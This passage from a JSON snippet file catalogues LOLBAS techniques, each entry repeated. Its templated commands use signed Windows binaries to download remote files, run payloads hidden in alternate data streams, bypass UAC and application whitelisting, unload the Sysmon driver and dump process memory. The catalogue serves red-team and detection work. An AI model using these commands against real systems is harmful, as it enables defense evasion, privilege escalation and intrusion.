            "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}${0}",
            "```"
        ],
        "description": "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Download and compresses the target file and stores it in the target file., requires  privilege, category: Download, it can be used for Download file and compress into a cab file."
    },
    "lolbas Makecab.exe Download file and compress into a cab file": {
        "prefix": "lolbas Makecab.exe",
        "body": [
            "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Download and compresses the target file and stores it in the target file., requires  privilege, category: Download, it can be used for Download file and compress into a cab file.",
            "",
            "```sh",
            "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}${0}",
            "```"
        ],
        "description": "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Download and compresses the target file and stores it in the target file., requires  privilege, category: Download, it can be used for Download file and compress into a cab file."
    },
    "Makecab.exe Bypass command-line based detections (lolbas)": {
        "prefix": "Makecab.exe",
        "body": [
            "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification., requires  privilege, category: Execute, it can be used for Bypass command-line based detections.",
            "",
            "```sh",
            "makecab /F {PATH:.ddf}${0}",
            "```"
        ],
        "description": "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification., requires  privilege, category: Execute, it can be used for Bypass command-line based detections."
    },
    "lolbas Makecab.exe Bypass command-line based detections": {
        "prefix": "lolbas Makecab.exe",
        "body": [
            "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification., requires  privilege, category: Execute, it can be used for Bypass command-line based detections.",
            "",
            "```sh",
            "makecab /F {PATH:.ddf}${0}",
            "```"
        ],
        "description": "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification., requires  privilege, category: Execute, it can be used for Bypass command-line based detections."
    },
    "CustomShellHost.exe Can be used to evade defensive counter-measures (lolbas)": {
        "prefix": "CustomShellHost.exe",
        "body": [
            "CustomShellHost.exe is A host process that is used by custom shells when using Windows in Kiosk mode.. it can Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the current working folder., requires  privilege, category: Execute, it can be used for Can be used to evade defensive counter-measures.",
            "",
            "```sh",
            "CustomShellHost.exe${0}",
            "```"
        ],
        "description": "CustomShellHost.exe is A host process that is used by custom shells when using Windows in Kiosk mode.. it can Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the current working folder., requires  privilege, category: Execute, it can be used for Can be used to evade defensive counter-measures."
    },
    "lolbas CustomShellHost.exe Can be used to evade defensive counter-measures": {
        "prefix": "lolbas CustomShellHost.exe",
        "body": [
            "CustomShellHost.exe is A host process that is used by custom shells when using Windows in Kiosk mode.. it can Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the current working folder., requires  privilege, category: Execute, it can be used for Can be used to evade defensive counter-measures.",
            "",
            "```sh",
            "CustomShellHost.exe${0}",
            "```"
        ],
        "description": "CustomShellHost.exe is A host process that is used by custom shells when using Windows in Kiosk mode.. it can Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the current working folder., requires  privilege, category: Execute, it can be used for Can be used to evade defensive counter-measures."
    },
    "Forfiles.exe Use forfiles to start a new process to evade defensive counter measures (lolbas)": {
        "prefix": "Forfiles.exe",
        "body": [
            "Forfiles.exe is Selects and executes a command on a file or set of files. This command is useful for batch processing.. it can Executes specified command since there is a match for notepad.exe in the c:\\windows\\System32 folder., requires  privilege, category: Execute, it can be used for Use forfiles to start a new process to evade defensive counter measures.",
            "",
            "```sh",
            "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\"${0}",
            "```"
        ],
        "description": "Forfiles.exe is Selects and executes a command on a file or set of files. This command is useful for batch processing.. it can Executes specified command since there is a match for notepad.exe in the c:\\windows\\System32 folder., requires  privilege, category: Execute, it can be used for Use forfiles to start a new process to evade defensive counter measures."
    },
    "lolbas Forfiles.exe Use forfiles to start a new process to evade defensive counter measures": {
        "prefix": "lolbas Forfiles.exe",
        "body": [
            "Forfiles.exe is Selects and executes a command on a file or set of files. This command is useful for batch processing.. it can Executes specified command since there is a match for notepad.exe in the c:\\windows\\System32 folder., requires  privilege, category: Execute, it can be used for Use forfiles to start a new process to evade defensive counter measures.",
            "",
            "```sh",
            "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\"${0}",
            "```"
        ],
        "description": "Forfiles.exe is Selects and executes a command on a file or set of files. This command is useful for batch processing.. it can Executes specified command since there is a match for notepad.exe in the c:\\windows\\System32 folder., requires  privilege, category: Execute, it can be used for Use forfiles to start a new process to evade defensive counter measures."
    },
    "Forfiles.exe Use forfiles to start a new process from a binary hidden in an alternate data stream (lolbas)": {
        "prefix": "Forfiles.exe",
        "body": [
            "Forfiles.exe is Selects and executes a command on a file or set of files. This command is useful for batch processing.. it can Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\\windows\\system32 folder., requires  privilege, category: ADS, it can be used for Use forfiles to start a new process from a binary hidden in an alternate data stream.",
            "",
            "```sh",
            "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{PATH_ABSOLUTE}:evil.exe\"${0}",
            "```"
        ],
        "description": "Forfiles.exe is Selects and executes a command on a file or set of files. This command is useful for batch processing.. it can Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\\windows\\system32 folder., requires  privilege, category: ADS, it can be used for Use forfiles to start a new process from a binary hidden in an alternate data stream."
    },
    "lolbas Forfiles.exe Use forfiles to start a new process from a binary hidden in an alternate data stream": {
        "prefix": "lolbas Forfiles.exe",
        "body": [
            "Forfiles.exe is Selects and executes a command on a file or set of files. This command is useful for batch processing.. it can Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\\windows\\system32 folder., requires  privilege, category: ADS, it can be used for Use forfiles to start a new process from a binary hidden in an alternate data stream.",
            "",
            "```sh",
            "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{PATH_ABSOLUTE}:evil.exe\"${0}",
            "```"
        ],
        "description": "Forfiles.exe is Selects and executes a command on a file or set of files. This command is useful for batch processing.. it can Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\\windows\\system32 folder., requires  privilege, category: ADS, it can be used for Use forfiles to start a new process from a binary hidden in an alternate data stream."
    },
    "DeviceCredentialDeployment.exe Can be used to stealthily run a console application (e.g. cmd.exe) in the background (lolbas)": {
        "prefix": "DeviceCredentialDeployment.exe",
        "body": [
            "DeviceCredentialDeployment.exe is Device Credential Deployment. it can Grab the console window handle and set it to hidden, requires  privilege, category: Conceal, it can be used for Can be used to stealthily run a console application (e.g. cmd.exe) in the background.",
            "",
            "```sh",
            "DeviceCredentialDeployment${0}",
            "```"
        ],
        "description": "DeviceCredentialDeployment.exe is Device Credential Deployment. it can Grab the console window handle and set it to hidden, requires  privilege, category: Conceal, it can be used for Can be used to stealthily run a console application (e.g. cmd.exe) in the background."
    },
    "lolbas DeviceCredentialDeployment.exe Can be used to stealthily run a console application (e.g. cmd.exe) in the background": {
        "prefix": "lolbas DeviceCredentialDeployment.exe",
        "body": [
            "DeviceCredentialDeployment.exe is Device Credential Deployment. it can Grab the console window handle and set it to hidden, requires  privilege, category: Conceal, it can be used for Can be used to stealthily run a console application (e.g. cmd.exe) in the background.",
            "",
            "```sh",
            "DeviceCredentialDeployment${0}",
            "```"
        ],
        "description": "DeviceCredentialDeployment.exe is Device Credential Deployment. it can Grab the console window handle and set it to hidden, requires  privilege, category: Conceal, it can be used for Can be used to stealthily run a console application (e.g. cmd.exe) in the background."
    },
    "Runexehelper.exe Executes arbitrary code (lolbas)": {
        "prefix": "Runexehelper.exe",
        "body": [
            "Runexehelper.exe is Launcher process. it can Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing, writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable., requires  privilege, category: Execute, it can be used for Executes arbitrary code.",
            "",
            "```sh",
            "runexehelper.exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Runexehelper.exe is Launcher process. it can Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing, writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable., requires  privilege, category: Execute, it can be used for Executes arbitrary code."
    },
    "lolbas Runexehelper.exe Executes arbitrary code": {
        "prefix": "lolbas Runexehelper.exe",
        "body": [
            "Runexehelper.exe is Launcher process. it can Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing, writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable., requires  privilege, category: Execute, it can be used for Executes arbitrary code.",
            "",
            "```sh",
            "runexehelper.exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Runexehelper.exe is Launcher process. it can Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing, writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable., requires  privilege, category: Execute, it can be used for Executes arbitrary code."
    },
    "Setres.exe Executes arbitrary code (lolbas)": {
        "prefix": "Setres.exe",
        "body": [
            "Setres.exe is Configures display settings. it can Sets the resolution and then launches 'choice' command from the working directory., requires  privilege, category: Execute, it can be used for Executes arbitrary code.",
            "",
            "```sh",
            "setres.exe -w 800 -h 600${0}",
            "```"
        ],
        "description": "Setres.exe is Configures display settings. it can Sets the resolution and then launches 'choice' command from the working directory., requires  privilege, category: Execute, it can be used for Executes arbitrary code."
    },
    "lolbas Setres.exe Executes arbitrary code": {
        "prefix": "lolbas Setres.exe",
        "body": [
            "Setres.exe is Configures display settings. it can Sets the resolution and then launches 'choice' command from the working directory., requires  privilege, category: Execute, it can be used for Executes arbitrary code.",
            "",
            "```sh",
            "setres.exe -w 800 -h 600${0}",
            "```"
        ],
        "description": "Setres.exe is Configures display settings. it can Sets the resolution and then launches 'choice' command from the working directory., requires  privilege, category: Execute, it can be used for Executes arbitrary code."
    },
    "Tar.exe Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism (lolbas)": {
        "prefix": "Tar.exe",
        "body": [
            "Tar.exe is Used by Windows to extract and create archives.. it can Decompress a compressed file from an alternate data stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism.",
            "",
            "```sh",
            "tar -xf {PATH}:ads${0}",
            "```"
        ],
        "description": "Tar.exe is Used by Windows to extract and create archives.. it can Decompress a compressed file from an alternate data stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism."
    },
    "lolbas Tar.exe Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism": {
        "prefix": "lolbas Tar.exe",
        "body": [
            "Tar.exe is Used by Windows to extract and create archives.. it can Decompress a compressed file from an alternate data stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism.",
            "",
            "```sh",
            "tar -xf {PATH}:ads${0}",
            "```"
        ],
        "description": "Tar.exe is Used by Windows to extract and create archives.. it can Decompress a compressed file from an alternate data stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism."
    },
    "Tar.exe Copy files (lolbas)": {
        "prefix": "Tar.exe",
        "body": [
            "Tar.exe is Used by Windows to extract and create archives.. it can Extracts archive.tar from the remote (internal) host to the current host., requires  privilege, category: Copy, it can be used for Copy files.",
            "",
            "```sh",
            "tar -xf {PATH_SMB:.tar}${0}",
            "```"
        ],
        "description": "Tar.exe is Used by Windows to extract and create archives.. it can Extracts archive.tar from the remote (internal) host to the current host., requires  privilege, category: Copy, it can be used for Copy files."
    },
    "lolbas Tar.exe Copy files": {
        "prefix": "lolbas Tar.exe",
        "body": [
            "Tar.exe is Used by Windows to extract and create archives.. it can Extracts archive.tar from the remote (internal) host to the current host., requires  privilege, category: Copy, it can be used for Copy files.",
            "",
            "```sh",
            "tar -xf {PATH_SMB:.tar}${0}",
            "```"
        ],
        "description": "Tar.exe is Used by Windows to extract and create archives.. it can Extracts archive.tar from the remote (internal) host to the current host., requires  privilege, category: Copy, it can be used for Copy files."
    },
    "ComputerDefaults.exe Execute a binary or script as a high-integrity process without a UAC prompt. (lolbas)": {
        "prefix": "ComputerDefaults.exe",
        "body": [
            "ComputerDefaults.exe is ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, emailing, and media playback.. it can Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\open\\command; if these are set by an attacker, the set command will be executed as a high-integrity process without a UAC prompt being displayed to the user. See 'resources' for which registry keys/values to set., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt..",
            "",
            "```sh",
            "ComputerDefaults.exe${0}",
            "```"
        ],
        "description": "ComputerDefaults.exe is ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, emailing, and media playback.. it can Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\open\\command; if these are set by an attacker, the set command will be executed as a high-integrity process without a UAC prompt being displayed to the user. See 'resources' for which registry keys/values to set., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt.."
    },
    "lolbas ComputerDefaults.exe Execute a binary or script as a high-integrity process without a UAC prompt.": {
        "prefix": "lolbas ComputerDefaults.exe",
        "body": [
            "ComputerDefaults.exe is ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, emailing, and media playback.. it can Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\open\\command; if these are set by an attacker, the set command will be executed as a high-integrity process without a UAC prompt being displayed to the user. See 'resources' for which registry keys/values to set., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt..",
            "",
            "```sh",
            "ComputerDefaults.exe${0}",
            "```"
        ],
        "description": "ComputerDefaults.exe is ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, emailing, and media playback.. it can Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\open\\command; if these are set by an attacker, the set command will be executed as a high-integrity process without a UAC prompt being displayed to the user. See 'resources' for which registry keys/values to set., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt.."
    },
    "Desktopimgdownldr.exe Download arbitrary files from a web server (lolbas)": {
        "prefix": "Desktopimgdownldr.exe",
        "body": [
            "Desktopimgdownldr.exe is Windows binary used to configure lockscreen/desktop image. it can Downloads the file and sets it as the computer's lockscreen, requires  privilege, category: Download, it can be used for Download arbitrary files from a web server.",
            "",
            "```sh",
            "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr${0}",
            "```"
        ],
        "description": "Desktopimgdownldr.exe is Windows binary used to configure lockscreen/desktop image. it can Downloads the file and sets it as the computer's lockscreen, requires  privilege, category: Download, it can be used for Download arbitrary files from a web server."
    },
    "lolbas Desktopimgdownldr.exe Download arbitrary files from a web server": {
        "prefix": "lolbas Desktopimgdownldr.exe",
        "body": [
            "Desktopimgdownldr.exe is Windows binary used to configure lockscreen/desktop image. it can Downloads the file and sets it as the computer's lockscreen, requires  privilege, category: Download, it can be used for Download arbitrary files from a web server.",
            "",
            "```sh",
            "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr${0}",
            "```"
        ],
        "description": "Desktopimgdownldr.exe is Windows binary used to configure lockscreen/desktop image. it can Downloads the file and sets it as the computer's lockscreen, requires  privilege, category: Download, it can be used for Download arbitrary files from a web server."
    },
    "Aspnet_Compiler.exe Execute proxied payload with Microsoft signed binary to bypass application control solutions (lolbas)": {
        "prefix": "Aspnet_Compiler.exe",
        "body": [
            "Aspnet_Compiler.exe is ASP.NET Compilation Tool. it can Execute C# code with the Build Provider and proper folder structure in place., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass application control solutions.",
            "",
            "```sh",
            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u${0}",
            "```"
        ],
        "description": "Aspnet_Compiler.exe is ASP.NET Compilation Tool. it can Execute C# code with the Build Provider and proper folder structure in place., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass application control solutions."
    },
    "lolbas Aspnet_Compiler.exe Execute proxied payload with Microsoft signed binary to bypass application control solutions": {
        "prefix": "lolbas Aspnet_Compiler.exe",
        "body": [
            "Aspnet_Compiler.exe is ASP.NET Compilation Tool. it can Execute C# code with the Build Provider and proper folder structure in place., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass application control solutions.",
            "",
            "```sh",
            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u${0}",
            "```"
        ],
        "description": "Aspnet_Compiler.exe is ASP.NET Compilation Tool. it can Execute C# code with the Build Provider and proper folder structure in place., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass application control solutions."
    },
    "Control.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism (lolbas)": {
        "prefix": "Control.exe",
        "body": [
            "Control.exe is Binary used to launch controlpanel items in Windows. it can Execute evil.dll which is stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "control.exe {PATH_ABSOLUTE}:evil.dll${0}",
            "```"
        ],
        "description": "Control.exe is Binary used to launch controlpanel items in Windows. it can Execute evil.dll which is stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "lolbas Control.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism": {
        "prefix": "lolbas Control.exe",
        "body": [
            "Control.exe is Binary used to launch controlpanel items in Windows. it can Execute evil.dll which is stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "control.exe {PATH_ABSOLUTE}:evil.dll${0}",
            "```"
        ],
        "description": "Control.exe is Binary used to launch controlpanel items in Windows. it can Execute evil.dll which is stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "Control.exe Use to execute code and bypass application whitelisting (lolbas)": {
        "prefix": "Control.exe",
        "body": [
            "Control.exe is Binary used to launch controlpanel items in Windows. it can Execute .cpl file. A CPL is a DLL file with CPlApplet export function), requires  privilege, category: Execute, it can be used for Use to execute code and bypass application whitelisting.",
            "",
            "```sh",
            "control.exe {PATH_ABSOLUTE:.cpl}${0}",
            "```"
        ],
        "description": "Control.exe is Binary used to launch controlpanel items in Windows. it can Execute .cpl file. A CPL is a DLL file with CPlApplet export function), requires  privilege, category: Execute, it can be used for Use to execute code and bypass application whitelisting."
    },
    "lolbas Control.exe Use to execute code and bypass application whitelisting": {
        "prefix": "lolbas Control.exe",
        "body": [
            "Control.exe is Binary used to launch controlpanel items in Windows. it can Execute .cpl file. A CPL is a DLL file with CPlApplet export function), requires  privilege, category: Execute, it can be used for Use to execute code and bypass application whitelisting.",
            "",
            "```sh",
            "control.exe {PATH_ABSOLUTE:.cpl}${0}",
            "```"
        ],
        "description": "Control.exe is Binary used to launch controlpanel items in Windows. it can Execute .cpl file. A CPL is a DLL file with CPlApplet export function), requires  privilege, category: Execute, it can be used for Use to execute code and bypass application whitelisting."
    },
    "Msbuild.exe Compile and run code (lolbas)": {
        "prefix": "Msbuild.exe",
        "body": [
            "Msbuild.exe is Used to compile and execute code. it can Build and execute a C# project stored in the target csproj file., requires  privilege, category: Execute, it can be used for Compile and run code.",
            "",
            "```sh",
            "msbuild.exe {PATH:.csproj}${0}",
            "```"
        ],
        "description": "Msbuild.exe is Used to compile and execute code. it can Build and execute a C# project stored in the target csproj file., requires  privilege, category: Execute, it can be used for Compile and run code."
    },
    "lolbas Msbuild.exe Compile and run code": {
        "prefix": "lolbas Msbuild.exe",
        "body": [
            "Msbuild.exe is Used to compile and execute code. it can Build and execute a C# project stored in the target csproj file., requires  privilege, category: Execute, it can be used for Compile and run code.",
            "",
            "```sh",
            "msbuild.exe {PATH:.csproj}${0}",
            "```"
        ],
        "description": "Msbuild.exe is Used to compile and execute code. it can Build and execute a C# project stored in the target csproj file., requires  privilege, category: Execute, it can be used for Compile and run code."
    },
    "Msbuild.exe Execute DLL (lolbas)": {
        "prefix": "Msbuild.exe",
        "body": [
            "Msbuild.exe is Used to compile and execute code. it can Executes generated Logger DLL file with TargetLogger export., requires  privilege, category: Execute, it can be used for Execute DLL.",
            "",
            "```sh",
            "msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo${0}",
            "```"
        ],
        "description": "Msbuild.exe is Used to compile and execute code. it can Executes generated Logger DLL file with TargetLogger export., requires  privilege, category: Execute, it can be used for Execute DLL."
    },
    "lolbas Msbuild.exe Execute DLL": {
        "prefix": "lolbas Msbuild.exe",
        "body": [
            "Msbuild.exe is Used to compile and execute code. it can Executes generated Logger DLL file with TargetLogger export., requires  privilege, category: Execute, it can be used for Execute DLL.",
            "",
            "```sh",
            "msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo${0}",
            "```"
        ],
        "description": "Msbuild.exe is Used to compile and execute code. it can Executes generated Logger DLL file with TargetLogger export., requires  privilege, category: Execute, it can be used for Execute DLL."
    },
    "Msbuild.exe Execute project file that contains XslTransformation tag parameters (lolbas)": {
        "prefix": "Msbuild.exe",
        "body": [
            "Msbuild.exe is Used to compile and execute code. it can Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+., requires  privilege, category: Execute, it can be used for Execute project file that contains XslTransformation tag parameters.",
            "",
            "```sh",
            "msbuild.exe {PATH:.proj}${0}",
            "```"
        ],
        "description": "Msbuild.exe is Used to compile and execute code. it can Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+., requires  privilege, category: Execute, it can be used for Execute project file that contains XslTransformation tag parameters."
    },
    "lolbas Msbuild.exe Execute project file that contains XslTransformation tag parameters": {
        "prefix": "lolbas Msbuild.exe",
        "body": [
            "Msbuild.exe is Used to compile and execute code. it can Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+., requires  privilege, category: Execute, it can be used for Execute project file that contains XslTransformation tag parameters.",
            "",
            "```sh",
            "msbuild.exe {PATH:.proj}${0}",
            "```"
        ],
        "description": "Msbuild.exe is Used to compile and execute code. it can Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+., requires  privilege, category: Execute, it can be used for Execute project file that contains XslTransformation tag parameters."
    },
    "Msbuild.exe Bypass command-line based detections (lolbas)": {
        "prefix": "Msbuild.exe",
        "body": [
            "Msbuild.exe is Used to compile and execute code. it can By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will interpret the options as if they were passed on the command line., requires  privilege, category: Execute, it can be used for Bypass command-line based detections.",
            "",
            "```sh",
            "msbuild.exe @{PATH:.rsp}${0}",
            "```"
        ],
        "description": "Msbuild.exe is Used to compile and execute code. it can By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will interpret the options as if they were passed on the command line., requires  privilege, category: Execute, it can be used for Bypass command-line based detections."
    },
    "lolbas Msbuild.exe Bypass command-line based detections": {
        "prefix": "lolbas Msbuild.exe",
        "body": [
            "Msbuild.exe is Used to compile and execute code. it can By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will interpret the options as if they were passed on the command line., requires  privilege, category: Execute, it can be used for Bypass command-line based detections.",
            "",
            "```sh",
            "msbuild.exe @{PATH:.rsp}${0}",
            "```"
        ],
        "description": "Msbuild.exe is Used to compile and execute code. it can By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will interpret the options as if they were passed on the command line., requires  privilege, category: Execute, it can be used for Bypass command-line based detections."
    },
    "Register-cimprovider.exe Execute code within dll file (lolbas)": {
        "prefix": "Register-cimprovider.exe",
        "body": [
            "Register-cimprovider.exe is Used to register new wmi providers. it can Load the target .DLL., requires  privilege, category: Execute, it can be used for Execute code within dll file.",
            "",
            "```sh",
            "Register-cimprovider -path {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "Register-cimprovider.exe is Used to register new wmi providers. it can Load the target .DLL., requires  privilege, category: Execute, it can be used for Execute code within dll file."
    },
    "lolbas Register-cimprovider.exe Execute code within dll file": {
        "prefix": "lolbas Register-cimprovider.exe",
        "body": [
            "Register-cimprovider.exe is Used to register new wmi providers. it can Load the target .DLL., requires  privilege, category: Execute, it can be used for Execute code within dll file.",
            "",
            "```sh",
            "Register-cimprovider -path {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "Register-cimprovider.exe is Used to register new wmi providers. it can Load the target .DLL., requires  privilege, category: Execute, it can be used for Execute code within dll file."
    },
    "fltMC.exe Defense evasion (lolbas)": {
        "prefix": "fltMC.exe",
        "body": [
            "fltMC.exe is Filter Manager Control Program used by Windows. it can Unloads a driver used by security agents, requires  privilege, category: Tamper, it can be used for Defense evasion.",
            "",
            "```sh",
            "fltMC.exe unload SysmonDrv${0}",
            "```"
        ],
        "description": "fltMC.exe is Filter Manager Control Program used by Windows. it can Unloads a driver used by security agents, requires  privilege, category: Tamper, it can be used for Defense evasion."
    },
    "lolbas fltMC.exe Defense evasion": {
        "prefix": "lolbas fltMC.exe",
        "body": [
            "fltMC.exe is Filter Manager Control Program used by Windows. it can Unloads a driver used by security agents, requires  privilege, category: Tamper, it can be used for Defense evasion.",
            "",
            "```sh",
            "fltMC.exe unload SysmonDrv${0}",
            "```"
        ],
        "description": "fltMC.exe is Filter Manager Control Program used by Windows. it can Unloads a driver used by security agents, requires  privilege, category: Tamper, it can be used for Defense evasion."
    },
    "Tttracer.exe Spawn process using other binary (lolbas)": {
        "prefix": "Tttracer.exe",
        "body": [
            "Tttracer.exe is Used by Windows 1809 and newer to Debug Time Travel. it can Execute specified executable from tttracer.exe. Requires administrator privileges., requires  privilege, category: Execute, it can be used for Spawn process using other binary.",
            "",
            "```sh",
            "tttracer.exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Tttracer.exe is Used by Windows 1809 and newer to Debug Time Travel. it can Execute specified executable from tttracer.exe. Requires administrator privileges., requires  privilege, category: Execute, it can be used for Spawn process using other binary."
    },
    "lolbas Tttracer.exe Spawn process using other binary": {
        "prefix": "lolbas Tttracer.exe",
        "body": [
            "Tttracer.exe is Used by Windows 1809 and newer to Debug Time Travel. it can Execute specified executable from tttracer.exe. Requires administrator privileges., requires  privilege, category: Execute, it can be used for Spawn process using other binary.",
            "",
            "```sh",
            "tttracer.exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Tttracer.exe is Used by Windows 1809 and newer to Debug Time Travel. it can Execute specified executable from tttracer.exe. Requires administrator privileges., requires  privilege, category: Execute, it can be used for Spawn process using other binary."
    },
    "Tttracer.exe Dump process by PID (lolbas)": {
        "prefix": "Tttracer.exe",
        "body": [
            "Tttracer.exe is Used by Windows 1809 and newer to Debug Time Travel. it can Dumps process using tttracer.exe. Requires administrator privileges, requires  privilege, category: Dump, it can be used for Dump process by PID.",
            "",
            "```sh",
            "TTTracer.exe -dumpFull -attach {PID}${0}",
            "```"
        ],
        "description": "Tttracer.exe is Used by Windows 1809 and newer to Debug Time Travel. it can Dumps process using tttracer.exe. Requires administrator privileges, requires  privilege, category: Dump, it can be used for Dump process by PID."
    },
    "lolbas Tttracer.exe Dump process by PID": {
        "prefix": "lolbas Tttracer.exe",
        "body": [
            "Tttracer.exe is Used by Windows 1809 and newer to Debug Time Travel. it can Dumps process using tttracer.exe. Requires administrator privileges, requires  privilege, category: Dump, it can be used for Dump process by PID.",
            "",
            "```sh",
            "TTTracer.exe -dumpFull -attach {PID}${0}",
            "```"
        ],
        "description": "Tttracer.exe is Used by Windows 1809 and newer to Debug Time Travel. it can Dumps process using tttracer.exe. Requires administrator privileges, requires  privilege, category: Dump, it can be used for Dump process by PID."
    },
    "Ie4uinit.exe Get code execution by copy files to another location (lolbas)": {
        "prefix": "Ie4uinit.exe",
        "body": [
            "Ie4uinit.exe is Executes commands from a specially prepared ie4uinit.inf file.. it can Executes commands from a specially prepared ie4uinit.inf file., requires  privilege, category: Execute, it can be used for Get code execution by copy files to another location.",
            "",
            "```sh",
            "ie4uinit.exe -BaseSettings${0}",
            "```"
        ],
        "description": "Ie4uinit.exe is Executes commands from a specially prepared ie4uinit.inf file.. it can Executes commands from a specially prepared ie4uinit.inf file., requires  privilege, category: Execute, it can be used for Get code execution by copy files to another location."
    },
    "lolbas Ie4uinit.exe Get code execution by copy files to another location": {
        "prefix": "lolbas Ie4uinit.exe",
        "body": [
